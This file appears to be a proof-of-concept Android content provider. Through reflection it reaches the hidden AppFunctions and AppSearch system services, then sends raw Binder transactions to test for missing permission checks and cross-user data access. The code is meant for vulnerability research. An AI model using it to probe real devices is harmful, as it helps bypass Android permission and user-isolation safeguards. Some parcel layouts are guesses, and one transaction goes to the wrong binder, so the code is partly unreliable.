package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class AppFuncDeepProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});
        cursor.addRow(new Object[]{"pkg", getContext().getPackageName()});

        IBinder binder = getServiceBinder("app_function");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.app.appfunctions.IAppFunctionManager";

        // Test searchAppFunctions with a callback that records what it receives
        testSearchWithCallback(binder, desc, cursor);

        // Test registerAppFunction properly
        testRegisterProper(binder, desc, cursor);

        // Test setAppFunctionEnabled properly
        testSetEnabledProper(binder, desc, cursor);

        // Test if we can query cross-user via Global AppSearch
        testGlobalSearch(binder, desc, cursor);

        return cursor;
    }

    private void testSearchWithCallback(IBinder binder, String desc, MatrixCursor cursor) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicReference<String> callbackResult = new AtomicReference<>("no_callback");

        IBinder callbackBinder = new android.os.Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
                try {
                    callbackResult.set("callback_code=" + code + " dataSize=" + data.dataSize());
                } catch (Exception e) {
                    callbackResult.set("callback_err=" + e.getMessage());
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                return true;
            }
            @Override
            public String getInterfaceDescriptor() {
                return "android.app.appfunctions.ISearchAppFunctionsCallback";
            }
        };

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // TX=5 = searchAppFunctions
            // Write search spec (try exact AIDL format)
            // AppFunctionAidlSearchSpec is a Parcelable
            data.writeInt(1); // non-null parcelable marker
            // Fields of AppFunctionAidlSearchSpec:
            data.writeString("*"); // query/searchExpression
            data.writeInt(100); // maxResultCount
            // callingPackage
            data.writeString(getContext().getPackageName());
            // callback
            data.writeStrongBinder(callbackBinder);

            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"search_transact", "SUCCESS"});
                // Wait briefly for callback
                boolean got = latch.await(2, TimeUnit.SECONDS);
                if (got) {
                    cursor.addRow(new Object[]{"search_callback", callbackResult.get()});
                } else {
                    cursor.addRow(new Object[]{"search_callback", "timeout_2s (async pending)"});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"search_transact", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"search_transact", "ERR:" + e.toString()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testRegisterProper(IBinder binder, String desc, MatrixCursor cursor) {
        // registerAppFunction TX=4
        // Try with bare minimum data that the original test used (which got SUCCESS)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // This is exactly what ResultProvider sends for TX=4:
            data.writeInt(1); // non-null marker
            data.writeString("*"); // gets interpreted as... ?
            data.writeInt(100); // number
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.ISearchCallback"));

            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"register_basic", "SUCCESS_NOPERM"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"register_basic", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"register_basic", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testSetEnabledProper(IBinder binder, String desc, MatrixCursor cursor) {
        // setAppFunctionEnabled TX=6
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(1);
            data.writeString("*");
            data.writeInt(100);
            data.writeStrongBinder(new StubBinder("android.app.appfunctions.IAppFunctionEnabledCallback"));

            binder.transact(6, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"setEnabled_basic", "SUCCESS_NOPERM"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"setEnabled_basic", "Ex=" + ex + " " + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"setEnabled_basic", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testGlobalSearch(IBinder binder, String desc, MatrixCursor cursor) {
        // Test if searchAppFunctions actually uses GlobalSearchSession
        // which could cross user boundaries
        // Also test what happens when Private Space (user 11) is active
        try {
            // First check if user 11 is running
            Class<?> am = Class.forName("android.app.ActivityManager");
            Method getService2 = am.getMethod("getService");
            Object iAm = getService2.invoke(null);
            cursor.addRow(new Object[]{"am_service", iAm != null ? "OK" : "null"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"am_service", "ERR:" + e.getClass().getSimpleName()});
        }

        // Try to access AppSearch global database directly
        try {
            IBinder appSearchBinder = getServiceBinder("app_search");
            if (appSearchBinder != null) {
                cursor.addRow(new Object[]{"appsearch_binder", "OK"});
                // AppSearch globalQuery could expose cross-user data
                String appSearchDesc = "android.app.appsearch.IAppSearchManager";
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(appSearchDesc);
                // globalQuery params
                data.writeString("*"); // query
                binder.transact(1, data, reply, 0);
                int ex = reply.readInt();
                cursor.addRow(new Object[]{"appsearch_tx1", ex == 0 ? "SUCCESS" : "Ex=" + ex});
                data.recycle();
                reply.recycle();
            } else {
                cursor.addRow(new Object[]{"appsearch_binder", "NOT_FOUND"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"appsearch_error", e.getClass().getSimpleName()});
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }

    private static class StubBinder extends android.os.Binder {
        private final String descriptor;
        StubBinder(String desc) { this.descriptor = desc; attachInterface(null, desc); }
        @Override public String getInterfaceDescriptor() { return descriptor; }
        @Override protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            if (reply != null) reply.writeNoException();
            return true;
        }
    }
}
